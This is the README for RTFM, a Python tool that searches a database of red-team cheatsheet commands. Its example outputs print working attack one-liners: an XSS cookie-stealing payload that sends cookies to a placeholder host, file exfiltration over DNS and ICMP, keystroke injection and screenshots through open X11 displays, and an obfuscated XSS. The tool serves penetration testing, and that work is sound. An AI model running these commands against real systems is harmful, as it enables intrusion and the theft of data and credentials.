#  What is it?
RTFM is a great and useful book, BUT a bit pointless when you have to transcribe it, so this little program will aim to be the spiritual successor to it.

I would recommend picking up a copy of the book from Amazon, it is pretty handy to have!

# Quick Start
```
Download, Update, Look for something!
 $ chmod +x rtfm.py
 $ ./rtfm.py -u
 $ ./rtfm.py -e 'Something'

```

# Usage 
```
$ rtfm.py -h
Usage: rtfm.py [OPTIONS]

For when you just cant remember the syntax,  you should just RTFM

Options:
  --version             show program's version number and exit
  -e SA, --everything=SA
  -h, --help            show this help message and exit
  --delete=DELETE       Delete specified ID
  -t TAG, --tag=TAG     Specify one or more tags to look for (a, b, c)
  -c CMD, --cmd=CMD     Specify a command to search (ls)
  -R REMARK, --remark=REMARK
                        Search the comments feilds
  -r REFER, --reference=REFER
                        Search for the reference [reference]
  -a AUTHOR, --author=AUTHOR
                        Search for author
  -A DATE, --added-on=DATE
                        Search by date, useful for when you want to commit back!
  -p PRINTER, --print=PRINTER
                        Print Types : P(retty) p(astable) w(iki) h(tml) d(ump)
  -i INSERT, --insert=INSERT
                        Insert c(ommand) | t(ags) | r(eferances) |
                        (E)verything
  -D DUMP, --dump=DUMP  Just Dump infomration about
                        t(ags)|c(commands)|r(eferances)a(ll)
  -d, --debug           Display verbose processing details (default: False)
  -u, --update          Check for updates (default: false)
  -v                    Shows the current version number and the current DB
                        hash and exits

Example: rtfm.py -c rtfm -t linux -R help -r git -pP -d

```
Its pretty much a simple search program, nothing to fancy, examples include:

# Searching the DB
Searching the DB is handled through the following switches: e, t, c, R, r, a and, A. When you are just browsing for a command, you will want to use e as this looks at the command, comment, and referances all at the same time, useful if you know a bit about something such as x11:

```
$ ./rtfm.py -e x11 -pP
+----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 82                                                                                                                                                                         |
+----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Command        | command="[cmd]";echo -n xdotool key " "; echo -n $command| sed  's# #€#g' | sed -e 's/\(.\)/\1 /g' | sed 's#/#slash#g' | sed 's#@#at#g'|  sed 's#€#space#g' | sed 's#-#minus#g'|sed |
|                | 's#>#greater#g'| sed 's#+#plus#g' | sed 's#"#quotedbl#g' | sed 's#~#asciitilde#g' | sed 's#\.#period#g' | sed 's#_#underscore#g'; echo KP_Enter                                     |
|                |                                                                                                                                                                                     |
| Comment        | Abuse open x11 : Think open term add user add key ;)                                                                                                                                |
| Tags           | linux                                                                                                                                                                               |
|                | bash                                                                                                                                                                                |
|                | interesting                                                                                                                                                                         |
| Date added     | 2018-02-11                                                                                                                                                                          |
| References     | https://necurity.co.uk                                                                                                                                                              |
|                | https://ubuntuforums.org/archive/index.php/t-1970619.html                                                                                                                           |
+----------------+-------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 272                                                                                                                                                          |
+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Command        | xwd -display [victim] :0 -root -out /tmp/[victim].xpm;xwd -display ip :0 -root -out /tmp/[victim].xpm; convert /tmp/[victim]; xpm -resize 1280x1024 /tmp/[victim].jpg |
|                |                                                                                                                                                                       |
| Comment        | take a screenshot from a open X11 and convert it to a jpg                                                                                                             |
| Tags           | linux                                                                                                                                                                 |
|                | bash                                                                                                                                                                  |
|                | scanning                                                                                                                                                              |
|                | pivoting                                                                                                                                                              |
| Date added     | 2018-02-11                                                                                                                                                            |
| References     | http://unix.stackexchange.com/questions/44821/how-do-i-screencap-another-xorg-display                                                                                 |
+----------------+-----------------------------------------------------------------------------------------------------------------------------------------------------------------------+
+----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 481                                                                                                                                                                                   |
+----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
| Command        | "\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\ |
|                | x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5 |
|                | f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\ |
|                | x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xb |
|                | e\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\ |
|                | xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"                                                                                                                       |
|                |                                                                                                                                                                                                |
| Comment        | Bad Char's block, re-send removing bad ones                                                                                                                                                    |
| Tags           | buffer overflow                                                                                                                                                                                |
| Date added     | 2018-02-11                                                                                                                                                                                     |
| References     | https://www.offensive-security.com/information-security-training/penetration-testing-training-kali-linux/                                                                                      |
|                | https://en.wikibooks.org/wiki/Metasploit/WritingWindowsExploit#Dealing_with_badchars                                                                                                           |
+----------------+------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------+
                                                                    
```

Any other time, one of t'other flags for other things;

-c is search for a command. Use this when you know what command you want to look for, but can't quite remember the syntax. For example, if you want to quickly look up the syntax for a common sqlmap command. Useful for jumping straight to collections of common flags or one liners:
```
19:54:root:rtfm: ./rtfm.py -pP -c 'sqlmap' 
+----------------+--------------------------------------------------------------------------------------------------+
| Added By @yght | Cmd ID : 162                                                                                     |
+----------------+--------------------------------------------------------------------------------------------------+
| Command        | /opt/sqlmap/sqlmap.py --exclude-sysdbs --eta --is-dba  --current-user --current-db --hostname -o |
|                | -r sql1.txt                                                                                      |
|                |                                                                                                  |
| Comment        | SQLmap generic command                                                                           |
| Tags           | sql injection                                                                                    |
| Date added     | 2017-06-19                                                                                       |
| References     | https://github.com/sqlmapproject/sqlmap/wiki/Usage                                               |
+----------------+--------------------------------------------------------------------------------------------------+
```

-t is search for a tag, tags are groups of similar commands, for example, XSS payloads. Use this when wanting a more generic search such as around flaws or around generic Windows commands:
```
19:54:root:rtfm: ./rtfm.py -pP -t xss
+----------------+------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 35                                                                        |
+----------------+------------------------------------------------------------------------------------+
| Command        | <script>i = new XMLHttpRequest(); i.open('GET', '[dest]' + document.cookie, true); |
|                | i.send();</script>                                                                 |
|                |                                                                                    |
| Comment        | Grab the cookie                                                                    |
| Tags           | web application                                                                    |
|                | XSS                                                                                |
|                | cookies                                                                            |
| Date added     | 2017-06-19                                                                         |
| References     | https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet                     |
|                | https://excess-xss.com/                                                            |
+----------------+------------------------------------------------------------------------------------+
<snip>
```

All the Tags known about can be shown through -Dt, Currently a few typos that will be fixed in version 0.9.9:
```
 $ rtfm.py -Dt
 | linux |  | bash |  | text manipulation |  | cisco |  | networking |  | loop |  | pivoting |  | files |  | passwords |  | enumeration |  | user information |  | interesting |  | scanning |  | hp |  | brute |  | http |  | web application |  | XSS |  | cookies |  | metasploit |  | certificates |  | stealth |  | smb |  | MitM |  | dns |  | package management |  | reverse shells |  | Windows |  | perl |  | python |  | php |  | ruby |  | sql injection |  | mysql |  | shell |  | mssql |  | Oracle |  | users |  | wireless |  | wifi |  | configuration |  | av evasion |  | powershell |  | memory |  | impacket |  | filesystem |  | IIS |  | process management |  | privilege escalation |  | remote command shell |  | hashes |  | recon |  | cracking |  | nessus |  | subnets |  | packet capture |  | reference |  | web address |  | java |  | solaris |  | forensics |  | ldap |  | Anti Virus |  | GIT |  | interesting  |  | Cloud |  | RDP |  | shells |  | encryption |  | Troll |  | buffer overflow |  | mona |  | interseting |  | brute force |  | Apple |  | encoding |  | ascii |  | web app |  | Cyber Essentials |  | tools |  | code execution |  | jsp | 
```

The next one you will want is -R, this is for searching for a 'remark' (aka comment, didn't want two c flags), this is to search the comments field and is more along the lines of searching for techniques or generic terms such as 'X11' or 'exfil': 
```
+----------------+------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 384                                                                       |
+----------------+------------------------------------------------------------------------------------+
| Command        | for line in `base64 -w 62 [file]`; do host $line.[hostname]; done                  |
|                |                                                                                    |
| Comment        | exfil file through DNS, may want to encrypt, also assuming you have a short domain |
| Tags           | linux                                                                              |
|                | bash                                                                               |
|                | loop                                                                               |
|                | interesting                                                                        |
| Date added     | 2017-06-19                                                                         |
| References     | https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504                  |
+----------------+------------------------------------------------------------------------------------+
+----------------+--------------------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 386                                                                                     |
+----------------+--------------------------------------------------------------------------------------------------+
| Command        | ping -p 11010101010101010101010101010199 -c 1 -M do 127.0.0.1 -s 32; for line in `base64         |
|                | sslfile.key | xxd -p -c 14`; do line2=`echo "11 $line 99" |tr -d ' '`; ping -p $line2 -c 1 -M do |
|                | 127.0.0.1 -s 32; done; ping -p 11101010101010101010101010101099 -c 1 -M do 127.0.0.1 -s 32       |
|                |                                                                                                  |
| Comment        | Exfil over icmp                                                                                  |
| Tags           | linux                                                                                            |
|                | networking                                                                                       |
|                | loop                                                                                             |
|                | interesting                                                                                      |
| Date added     | 2017-06-19                                                                                       |
| References     | https://www.amazon.co.uk/Rtfm-Red-Team-Field-Manual/dp/1494295504                                |
+----------------+--------------------------------------------------------------------------------------------------+
+----------------+-----------------------------------------------------------------------------------------------+
| Added By Innes | Cmd ID : 496                                                                                  |
+----------------+-----------------------------------------------------------------------------------------------+
| Command        | for line in $(tshark -r [pcap] -T fields -e data  | uniq | grep -v                            |
|                | "......................................................" | sed s/.*11/11/g | grep "11.*99"  | |
|                | sed s/11// | sed s/99$// | tr -d '\n' | sed s/0101010101010101010101010101/'\n'/g |sed        |
|                | s/010101010101010101010101010//g); do echo $line | xxd -r  -p | base64 -d;echo                |
|                | +++++++++++++++++++; done                                                                     |
|                |                                                                                               |
| Comment        | Convert exfil ICMP back to files from pcap                                                    |
| Tags           | linux                                                                                         |
|                | networking                                                                                    |
|                | loop                                                                                          |
| Date added     | 2017-06-19                                                                                    |
| References     | https://ask.wireshark.org/questions/15374/dump-raw-packet-data-field-only                     |
+----------------+-----------------------------------------------------------------------------------------------+

```


These next two are aimed for when you wish to commit back, and wouldn't be normally used:

-a is to search by author, for example, show things you have added:
`./rtfm.py -a innes`

-A is 'Added on date', this can be one of yyyy-mm-dd, or now/today, most usefully for dumping out commands you have added to commit back to the git!

```
rtfm.py -A now
++++++++++++++++++++++++++++++
Command ID : 469
Command    : b

Comment    : b
Tags       : b
Date Added : 2017-05-14
Added By   : b
References
__________
b
++++++++++++++++++++++++++++++

rtfm.py -A 2017-05-14
++++++++++++++++++++++++++++++
Command ID : 469
Command    : b

Comment    : b
Tags       : b
Date Added : 2017-05-14
Added By   : b
References
__________
b
++++++++++++++++++++++++++++++

```

All of these search flags can be combinded to create a very specfic search should you wish, shown here with debugging on:
```
rtfm.py -c rtfm -a innes -t linux -R help -A 2017-05-10 -d
[DEBUG]: Options Set: {'insert': None, 'remark': 'help', 'printer': None, 'dump': None, 'author': 'innes', 'cmd': 'rtfm', 'update': None, 'debug': True, 'tag': 'linux', 'date': '2017-05-10', 'delete': None, 'refer': None}
[DEBUG]: S: SELECT c.cmdid, c.cmd, c.cmnt, c.date, c.author, group_concat(DISTINCT tc.tag), group_concat(DISTINCT ref) FROM tblcommand c JOIN tbltagmap tm ON tm.cmdid = c.cmdid JOIN tbltagcontent tc ON  tc.tagid = tm.tagid JOIN tblrefmap rm ON rm.cmdid = c.cmdid JOIN tblrefcontent rc on rc.id = rm.refid WHERE c.cmd LIKE ?  AND c.cmnt LIKE ?  AND c.author LIKE ?  AND c.date = ? GROUP BY c.cmdid  HAVING  group_concat(tc.tag) like ? 
[DEBUG]: W: ['%rtfm%', '%help%', '%innes%', '2017-05-10', '%linux%']
[DEBUG]: This Returned : [(1, 'rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P', 'Helpception, search for a command with two tags and a comment', '2017-05-10', 'Innes', 'linux', 'https://github.com/leostat/rtfm,https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html')]
++++++++++++++++++++++++++++++
Command ID : 1
Command    : rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P

Comment    : Helpception, search for a command with two tags and a comment
Tags       : linux
Date Added : 2017-05-10
Added By   : Innes
References
__________
https://github.com/leostat/rtfm
https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
++++++++++++++++++++++++++++++

```

# Updating your database

RTFM implements a simple text file format to pull in updates to the database, these are shared VIA git, and implement a simple sha check to make sure they have not been corrupt during download. The updates called by the command are 'safe' in the form they won't write over your DB, should you git pull, it probably will overwrite your DB. If you are git cloning, you can move your database to '/etc/rtfm/snips.db' to protect your database file. 
```
./rtfm.py -u
[WARNING]: No DB, please run rtfm -u
[OK]: This may appear to hang. Run with debug to get more info
[OK]: Program version information:
[OK]: Your up to date :
0.9.8
 Added A way of fixing typo's in the database 
 Added program version checking 
 Couple of code fixes
DATE
1 
+++++++++++++++++++++++++++
[OK]: Added Rows :1
[OK]: Added a new tag and a tagmap
[OK]: Added a new Ref and a refmap
[OK]: Added a new Ref and a refmap
[OK]: Added Rows :1
[OK]: Added tags
[OK]: Added a new tag and a tagmap
[OK]: Added a new tag and a tagmap
[OK]: Added a new Ref and a refmap
[OK]: Added a new Ref and a refmap
[OK]: Added Refs
[OK]: Hopefully added lots of new commands
[OK]: Parsed Line of update
[OK]: Hopefully fixed lots of commands
[OK]: Update complete

```

The update process also now drags in errata for the local DB allowing me a centralised way of neatly fixing the typos which have filtered into the DB. These are set through https://raw.githubusercontent.com/leostat/rtfm/master/updates/errata.txt. This allows things to be 'fixed' without needing to remove anything from the database.

# Inserting and committing back
Like all good cheatsheets, it is possible to add your own content to the database. This is managed through the -i segment of the program. When adding commands you must add them with comments, references, and tags. Else at the moment, they will not be returned from the DB. Minor bug really. This is done by adding all commands, along with their tags and references at once through using -iE, Insert everything:
```
9:41:root:rtfm: ./rtfm.py -iE
Enter your command    : セ=ア[ミ=ウ],ハ=++ミ+ウ,ヘ=ホ[ミ+ハ],ア[ヘ+=ホ[ウ]+(ホ.ホ+ホ)[ウ]+ネ[ハ]+ヌ+セ+ア[ミ]+ヘ+ヌ+ホ[ウ]+セ][ヘ](ネ[ウ]+ネ[ミ]+ア[ハ]+セ+ヌ+"(ウ)")()
Enter you comment     : Script alert(1) using Katakana 
Enter Author          : Innes
Enter a tag (blank for end) : xss
Enter a tag (blank for end) : web application
Enter a tag (blank for end) : 
Enter a reference (blank for end) : https://github.com/aemkei/katakana.js
Enter a reference (blank for end) : 
[OK]: Added Rows :1
[OK]: Added tags
[OK]: Added tags
[OK]: Added a new Ref and a refmap
Enter your command    : ^C

Cancelled.

```

After committing to your local database I would be extremely grateful if you would open a pull request so that I am able to continue to add to the database. This is really easy, and done through the use of an output format 'pd' (print dump). The easiest way is by searching for commands added by yourself on today, then opening a git pull request, for the above example:
```
19:43:root:rtfm: ./rtfm.py -a Innes -A now -pd
セ=ア[ミ=ウ],ハ=++ミ+ウ,ヘ=ホ[ミ+ハ],ア[ヘ+=ホ[ウ]+(ホ.ホ+ホ)[ウ]+ネ[ハ]+ヌ+セ+ア[ミ]+ヘ+ヌ+ホ[ウ]+セ][ヘ](ネ[ウ]+ネ[ミ]+ア[ハ]+セ+ヌ+"(ウ)")()
Script alert(1) using Katakana 
Innes
EOC
web application
XSS
EOT
https://github.com/aemkei/katakana.js
EOR
```

The above is the correct format for the updates, so you can add a file and I can either merge into one large update file, or keep it as a separate file! 

# Output Formats

There is also a number of output options, such as copy any paste, pretty, wiki and update:
```
23:15:root:snips: ./rtfm.py -c rtfm -p p
++++++++++++++++++++++++++++++
RTFM

helpception
++++++++++++++++++++++++++++++

23:15:root:snips: ./rtfm.py -c rtfm -p P
+-------------+-------------+
| Command ID  | 0           |
+-------------+-------------+
| Command     | RTFM        |
|             |             |
| Comment     | helpception |
| Tags        | Linux       |
| Date added  | 2017-01-30  |
+-------------+-------------+

23:15:root:snips: ./rtfm.py -c rtfm -p w
= Helpception, search for a command with two tags and a comment = 
 rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
linux
https://github.com/leostat/rtfm

```
The update format is to make it easy to open pull requests for new commands!
```
rtfm.py -pd -c rtfm
rtfm.py -c [command] -t [tag],[tag] -C [comment] -p P
Helpception, search for a command with two tags and a comment
Innes
EOC
linux
EOT
https://github.com/leostat/rtfm
https://necurity.co.uk/osprog/2017-02-27-RTFM-Pythonized/index.html
EOR
```

# Older way
Should you wish to add say lots of commands at once, then worry about tags and references later you could do call RTFM with '-i c', using an empty response to stop processing commands:
```
$ rtfm.py -i c
Enter your command    : Your Command
Enter you comment     : Your Comment 
Enter Author          : Your Name 
Enter your command    : Command Two 
Enter you comment     : Comment Two 
Enter Author          : Your Name 
Enter your command    : 
Enter you comment     : 
Enter Author          : 
[OK]: Added Rows : 2
[OK]: New Top ID : 491 | Number of CMD's Added : 2
```
Next, add the required tags into the inserted with either '-i t', which adds tags to a single command, or '-i ta' which adds tags to all commands missing tags:
```
$ rtfm.py -i t
What CMD are we adding tags too? : 491
Enter a tag (blank for none) : Test
Enter a tag (blank for none) : Second Tag
Enter a tag (blank for none) : 
[OK]: Added tags
[OK]: Added a new tag and a tagmap
```
Similarly , you now have to add referances to the commands you have just added, '-i r',
```
$ rtfm.py -i r
What CmdID are we adding refs to? : 491
Enter a reference (blank for non) : http://bing.com 
Enter a reference (blank for non) : 
[OK]: Added a new Ref and a refmap
```
There is also a '-i ta' which adds tags to all commands which are missing them, this was used for the DB seeding more than anything!
```
$ rtfm: ./rtfm.py -i ta
[OK]: This tags everything without tags,  mainly for DB init
[OK]: Enter blank line to commit changes
[WARNING]: Number left :22
[OK]: Command ID : 467
[OK]:         Command    : Test Command
[OK]:         Comment    : My comment
[OK]: v These are known tags
 | linux |  | bash |  | text manipulation |  | cisco |  | networking |  | loop |  | pivoting |  | files |  | passwords |  | enumeration |  | user information |  | interesting |  | scanning |  | hp |  | brute |  | http |  | web application |  | XSS |  | cookies |  | metasploit |  | certificates |  | stealth |  | smb |  | MitM |  | dns |  | package management |  | reverse shells |  | Windows |  | perl |  | python |  | php |  | ruby |  | sql injection |  | mysql |  | shell |  | mssql |  | Oracle |  | users |  | wireless |  | wifi |  | configuration |  | av evasion |  | powershell |  | memory |  | impacket |  | filesystem |  | IIS |  | process management |  | privilege escalation |  | remote command shell |  | hashes |  | recon |  | cracking |  | nessus |  | subnets |  | packet capture |  | reference |  | web address |  | java |  | solaris |  | forensics |  | ldap |  | Anti Virus |  | GIT |  | interesting  |  | Cloud |  | RDP |  | shells |  | encyption |  | Test |  | Second Tag | 
 == == ONE TAG A LINE == == 

Enter a tag (blank for non) : 
```

# Deleting content
This is simple enough, 'tis just using:
`rtfm.py --delete 1`

# Debugging
Throughout the entire program, I have tried to add 'debug' calls '-d', these show you what the SQL is doing, what is being passed around.




# Version 0.9.9 TODO
 * Central way of adding, removing , tags
 * Python three compat (See push)
 * Fix the darn typos in the python program

# Version 1.0.0 TODO
 * Add a template system
 * Add a spawn shell system

# Version 2
 * Coming way in the future
 * Better text support
 * nicer updating
 * Python 3


# The TODO  list
 * The 'important' functionality is present, but still lots of work to do
 * Changes are happening on the DB, which means it may 'break' from time to time, just do a git pull to fix 
 
## Fixes:
 * Probably should use prepared statements: local so don't care
 * Check for dupe tags
 * Central tag updates

## Pipeline:
 * Template engine(autofill [user] : A user = innes, pass = password, attacker = 1.1.1.1, victim = 2.2.2.2
 * Make code more sane and betterize the layout

## Future:
 * Cool Thing mode
 * Fix the typos


# Credits 
The people that deserve the credits will be in the reference table of the DB. They are the ones doing the work!

# Thanks
Thanks in no particular order :) : 
```
@VC : Fixing many a bug!
@Rezkon : Suggesting new features and making the layout more sane
@David : Being the beta tester and finding all the bugs!
@Matthew S : Berating me into making the DB so much better and putting up with the n00b db questions
@ECSC :  Allowing me to publish! Go check them out : https://ecsc.co.uk
@Fabien : 'Just run FSCK in dry run mode' . . . ;D
```
